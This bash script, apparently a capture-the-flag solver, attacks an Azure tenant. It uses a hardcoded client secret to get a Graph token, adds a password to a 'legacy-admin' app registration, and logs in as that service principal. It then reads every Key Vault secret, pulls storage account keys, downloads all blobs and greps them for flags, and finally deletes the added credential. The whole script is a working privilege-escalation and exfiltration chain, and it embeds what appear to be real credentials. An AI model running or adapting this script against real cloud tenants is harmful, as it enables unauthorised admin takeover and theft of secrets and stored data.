#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
FLAGRE='[A-Za-z0-9_]{2,}\{[^}]{3,}\}'
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials \
  --data-urlencode client_id=462d1c38-4459-48b8-9333-82e389e59514 \
  --data-urlencode "client_secret=sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj" \
  --data-urlencode scope=https://graph.microsoft.com/.default | jq -r .access_token)

OID=22a3fb7e-860a-4708-9e50-3d36aa21191c   # legacy-admin objectId
AID=891fb158-e02c-4428-a885-53b811f369c0   # legacy-admin appId
RESP=$(curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/$OID/addPassword" -d '{"passwordCredential":{"displayName":"tmp"}}')
SECRET=$(echo "$RESP" | jq -r .secretText); KID=$(echo "$RESP" | jq -r .keyId)
echo "addPassword keyId=$KID secret_len=${#SECRET}"
echo "chờ 60s cho propagation..."; sleep 60

az login --service-principal -u "$AID" -p "$SECRET" -t "$TEN" --allow-no-subscriptions
echo "===== WHOAMI ====="; az account show -o json 2>&1 | head -20

echo "===== KV-TBL-SEC ====="
az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv 2>&1 | head
for s in $(az keyvault secret list --vault-name kv-tbl-sec-x3euoz --query "[].name" -o tsv 2>/dev/null); do
  echo "SEC $s = $(az keyvault secret show --vault-name kv-tbl-sec-x3euoz -n "$s" --query value -o tsv 2>/dev/null)"
done

echo "===== STORAGE (listKeys + blobs) ====="
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  K=$(az storage account keys list -n "$sa" --query "[0].value" -o tsv 2>/dev/null)
  [ -z "$K" ] && { echo "[$sa] no key"; continue; }
  echo "[$sa] KEY OK"
  for c in $(az storage container list --account-name "$sa" --account-key "$K" --query "[].name" -o tsv 2>/dev/null); do
    for b in $(az storage blob list --account-name "$sa" -c "$c" --account-key "$K" --query "[].name" -o tsv 2>/dev/null); do
      az storage blob download --account-name "$sa" -c "$c" -n "$b" --account-key "$K" -f /tmp/b --no-progress -o none 2>/dev/null
      echo "  $sa/$c/$b :: $(grep -aoE "$FLAGRE" /tmp/b | head -1)"
    done
  done
done

curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/$OID/removePassword" -d "{\"keyId\":\"$KID\"}" -o /dev/null
echo "cleaned keyId=$KID"
echo "===== DONE ====="
